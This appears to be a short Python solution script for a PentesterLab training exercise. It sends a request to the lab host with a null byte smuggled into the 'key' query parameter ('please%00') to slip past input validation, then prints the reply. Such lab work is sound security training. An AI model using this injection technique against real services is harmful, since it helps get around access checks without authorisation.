#!/usr/bin/env python3

import requests

url = 'http://ptl-a4c50e24-cbdba572.libcurl.so/pentesterlab'

req = requests.Request('GET',url=url)
prepared_req = req.prepare()

prepared_req.url += "?key=please%00"

s = requests.session()
resp = s.send(prepared_req)

print(resp.url)
print(resp.text)
